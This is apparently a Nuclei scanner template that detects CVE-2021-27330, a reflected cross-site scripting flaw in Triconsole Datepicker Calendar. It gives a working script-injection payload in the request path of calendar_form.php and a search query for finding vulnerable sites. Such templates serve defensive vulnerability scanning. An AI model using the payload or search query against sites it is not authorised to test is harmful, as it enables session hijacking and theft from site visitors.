id: CVE-2021-27330

info:
  name: Triconsole Datepicker Calendar <3.77 - Cross-Site Scripting
  author: pikpikcu,daffainfo
  severity: medium
  description: |
    Triconsole Datepicker Calendar before 3.77 contains a cross-site scripting vulnerability in calendar_form.php. Attackers can read authentication cookies that are still active, which can be used to perform further attacks such as reading browser history, directory listings, and file contents.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary JavaScript code in the context of the victim's browser, leading to session hijacking, defacement, or theft of sensitive information.
  remediation: |
    Upgrade to a patched version of Triconsole Datepicker Calendar that properly validates user input to prevent XSS attacks.
  reference:
    - https://www.exploit-db.com/exploits/49597
    - http://www.triconsole.com/
    - http://www.triconsole.com/php/calendar_datepicker.php
    - https://nvd.nist.gov/vuln/detail/CVE-2021-27330
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-27330
    cwe-id: CWE-79
    epss-score: 0.00437
    epss-percentile: 0.72015
    cpe: cpe:2.3:a:triconsole:datepicker_calendar:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: triconsole
    product: datepicker_calendar
    google-query: intitle:TriConsole.com - PHP Calendar Date Picker
  tags: xss,edb,cve,cve2021,triconsole

http:
  - method: GET
    path:
      - '{{BaseURL}}/calendar/calendar_form.php/"><script>alert(document.domain)</script>'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<script>alert(document.domain)</script>'
          - '<title>TriConsole.com - PHP Calendar Date Picker</title>'
        condition: and

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
# digest: 4b0a00483046022100eefe6c0d2eeccd830af99a333a87437a858bdcc54b8a5cad99cae3894548afe3022100ae88b48604d95087bfdcbc2a8e20b25e11796135fc58218fcb6638dc9d931f7e:922c64590222798bb761d5b6d8e72950